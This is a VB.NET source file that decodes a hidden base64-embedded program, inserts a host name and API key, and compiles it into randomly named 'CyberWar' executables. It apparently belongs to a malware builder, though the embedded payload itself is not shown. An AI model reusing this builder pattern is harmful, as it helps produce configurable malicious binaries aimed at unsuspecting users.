Public Module Build
    Dim Compiler As New EthernalCompiler

    Sub Main(args As String())
        Dim hostName As String = args(0)
        Dim apiKey As String = args(1)
        Dim runUp As String = args(2)
        Build(hostName, apiKey, runUp)
    End Sub
    Public Function Build(ByVal hostname As String, ByVal apikey As String, ByVal runup As Boolean)
        Dim encsource() As Byte = Convert.FromBase64String(My.Resources.src_bak)
        Dim source As String = System.Text.Encoding.UTF8.GetString(encsource)

        source = source.Replace("%APIKEY%", apikey)
        source = source.Replace("%HOSTNAME%", hostname)
        source = source.Replace("%RUNTIME%", runup)

        Compiler.Source = source
        Compiler.File_Align = File_Align._8192
        Compiler.DotNetVersion = DotNetVersion.v4
        Compiler.Platform = Platform.AnyCPU
        Compiler.ErrorLog = False
        Compiler.References = New [String]() {"system.windows.forms.dll", "system.drawing.dll", "Microsoft.VisualBasic.dll", "mscorlib.dll"}
        Compiler.Target = Target.WinForms
        Compiler.SilentMode = False
        Compiler.Optimize = True
        Compiler.WarningLevel = WarningLevel.None
        Compiler.Unsafe = True
        Dim saveFile As String = My.Computer.FileSystem.CurrentDirectory & "\generate\CyberWar-" & GetRandom(1, 2045) & ".exe"

        Compiler.Compile(saveFile)
        'MessageBox.Show("Succesfully compiled!", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Function
    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        Static Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max)
    End Function
End Module
